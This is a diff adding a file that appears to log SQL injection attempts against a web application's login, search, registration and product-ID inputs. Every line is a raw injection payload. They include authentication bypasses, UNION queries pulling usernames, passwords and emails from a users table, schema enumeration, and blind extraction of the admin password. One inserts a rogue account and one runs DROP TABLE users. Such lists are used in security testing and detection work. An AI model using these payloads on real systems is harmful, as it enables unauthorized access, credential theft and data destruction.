@@ -1,0 +1,24 @@
+Login attempt: username=' OR '1'='1, password=anything
+Login attempt: username=admin'--, password=admin123
+Login attempt: username=' UNION SELECT 1,2,3,4,5--, password=admin123
+' OR '1'='1
+' UNION SELECT * FROM users--
+' AND 1=1--
+1; INSERT INTO users (username, password) VALUES ('hacker', 'pass')--
+Search attempt: ' OR 1=1--
+Search attempt: ' UNION SELECT id,username,password,email,role FROM users--
+Product ID attack: 1'
+Product ID attack: 2'
+Login attempt: username='1=1', password=asjkbdfgoiuBSdgjkbajlsdfgpuijaSDBFIUJASBDfiupbpaius
+Login attempt: username=ADMIN' --, password=asd
+Register attempt: username=' UNION SELECT id,username,password,email,role FROM users--, email=demo@balot.com
+SELECT * FROM all_tables
+Product ID attack: 1' UNION SELECT * FROM users--
+Product ID attack: ' UNION SELECT 1,table_name,3 FROM information_schema.tables--
+Login attempt: username=' AND 1=1--
+Login attempt: username=AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'
+Product ID attack: 4 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'
+Product ID attack: 1'; DROP TABLE users--
+Product ID attack: 1' OR 1=1--
+Login attempt: username=' OR '1'='1' AND '1'='1
+Login attempt: username=admin'--
